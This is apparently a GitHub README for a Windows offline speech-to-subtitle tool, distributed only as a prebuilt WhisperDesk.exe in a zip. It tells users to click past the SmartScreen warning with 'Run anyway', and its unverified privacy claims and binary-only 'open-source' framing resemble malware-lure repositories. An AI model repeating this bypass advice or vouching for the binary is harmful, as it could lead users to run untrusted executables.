<p align="center">
  <img src="https://i.postimg.cc/90BBpfFr/banner.png" alt="WhisperDesk Offline Transcriber — Local Video & Audio to TXT / SRT Subtitles" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Offline%20Speech-to-Text-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-whisperdesk--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# WhisperDesk Offline Transcriber — Local Video & Audio to TXT / SRT Subtitles

**Need accurate text transcripts or timed .SRT subtitles from long lectures, interviews, podcasts, or YouTube videos without paying per minute or uploading private recordings to the cloud? Transcribe locally on your PC in 90+ languages.**

WhisperDesk Offline Transcriber brings local Whisper speech recognition to a clean Windows desktop interface: **extracting audio from `.mp4`, `.mkv`, `.mp3`, `.wav`, and `.m4a` files, running GPU/CPU inference offline, and exporting timestamped `.srt`, `.vtt`, and `.txt` files**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) students, video editors, journalists, and creators** who want unlimited offline transcription with complete data privacy.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Cloud transcription services charge per minute or cap uploads | Web tools restrict free users to 10-minute files and require cloud uploads | Transcribe unlimited 2-hour recordings locally on your own hardware |
| Need synchronized `.SRT` captions for Premiere / Resolve / YouTube | Manual caption timing takes hours per video | Export frame-accurate `.srt` and `.vtt` subtitle files automatically |
| Confidential meetings or interviews cannot leave your PC | Uploading client audio violates NDA and privacy rules | Process 100% offline with zero network requests |
| Mixed-language or accented technical recordings | Basic OS dictation struggles with punctuation and terminology | Use multi-lingual Whisper models with automatic punctuation |

## Download for Windows

[**Download WhisperDesk.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/WhisperDesk.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `WhisperDesk.exe`? (Key features)

- Transcribes `.mp4`, `.mkv`, `.mov`, `.mp3`, `.wav`, `.m4a`, and `.ogg` files directly.
- Exports clean `.txt` paragraphs, timestamped `.srt` / `.vtt` subtitles, and `.json` word segments.
- Supports NVIDIA CUDA GPU acceleration as well as fast quantized CPU execution.
- Supports 90+ languages with automatic language detection and punctuation.

### Sample Output

```text
[WhisperDesk] Input: Devlog_Voiceover_04.wav (18m 24s | 48 kHz Stereo)
[INFO] Compute Backend  : NVIDIA CUDA (RTX GPU Accelerated) | Model: Base-EN
[OK]   00:00:01,200 --> 00:00:04,850 : Welcome back to the November build update.
[OK]   Exported Files   : Devlog_Voiceover_04.srt, Devlog_Voiceover_04.txt (Done in 14.2s)
```

The release ZIP is named `WhisperDesk.zip`; the Windows executable inside is named `WhisperDesk.exe`.

1. Close WhisperDesk before updating or replacing executable files.
2. Click **Download WhisperDesk.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `WhisperDesk.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit), 8 GB+ RAM (NVIDIA GPU optional for 10x faster CUDA acceleration).

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `WhisperDesk.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Expensive per-minute SaaS transcription subscriptions

Running speech-to-text locally removes recurring fees and file-duration limits.

### Privacy and NDA compliance for recorded calls

Local inference ensures audio never touches external servers.

### Formatting raw text into valid `.SRT` timecodes

Automatic sentence segmentation produces ready-to-import subtitle tracks.

### No Python environment setup headaches

Bundled portable runtime works out of the box without configuring Conda or PyTorch manually.

## Default folders and configuration paths

WhisperDesk writes generated transcripts and subtitle files directly beside your source media:

```text
%USERPROFILE%\Documents\Transcripts\
```

Typical directory layout:

```text
MediaFolder\
├── Interview_01.mp4
├── Interview_01.srt    (Timed subtitles for video editors / YouTube)
└── Interview_01.txt    (Clean readable transcript)
```

For best accuracy on noisy recordings, use clear mono/stereo speech tracks without loud background music.

## Quick start guide

Follow these steps to get started:

1. **Extract `WhisperDesk.zip` to a local folder.** Ensure at least 2 GB of free disk space for local model weights.
2. **Launch `WhisperDesk.exe` and drop your audio or video file.** Supports drag-and-drop for single or multiple files.
3. **Choose model size (`Tiny` / `Base` for speed, `Small` / `Medium` for maximum accuracy).** Select `Auto-Detect` or a specific spoken language.
4. **Select output formats (`.srt`, `.vtt`, `.txt`).** Click **Start Transcription**.
5. **Open the generated `.srt` or `.txt` file beside your media.** Import `.srt` directly into DaVinci Resolve, Premiere Pro, or CapCut.

### Data safety note

Source audio and video files are read in read-only mode and never modified.

## What the status summary shows

WhisperDesk displays **audio duration, active compute device (GPU/CPU), detected language, and exported `.srt`/`.txt` paths**.

## FAQ

**Does WhisperDesk require an internet connection?**

Only if you choose to download an additional language model; transcription itself runs 100% offline.

**Do I need an NVIDIA graphics card?**

No—NVIDIA GPUs accelerate transcription significantly, while quantized CPU mode runs smoothly on any modern Ryzen or Intel processor.

**What subtitle formats can it export?**

Standard SubRip (`.srt`), WebVTT (`.vtt`), and plain text (`.txt`).

## Useful reading

- [OpenAI Whisper Paper & Open-Source Reference](https://github.com/openai/whisper)

## More Windows Desktop Utilities

- [ClipShrink-DiscordCompressor](../ClipShrink-DiscordCompressor) — Compress gameplay clips to exact 10 MB / 50 MB Discord limits
- [SnapFormat-BatchMediaConverter](../SnapFormat-BatchMediaConverter) — Offline batch HEIC/WebP/MKV to JPG/PNG/MP4 converter
- [CleanCut-OfflineBgRemover](../CleanCut-OfflineBgRemover) — Offline batch image background remover & PNG cutout tool
- [SnipText-ScreenOCRClipboard](../SnipText-ScreenOCRClipboard) — Instant hotkey screen region OCR text extractor to clipboard

*Independent open-source desktop utility for Windows.*
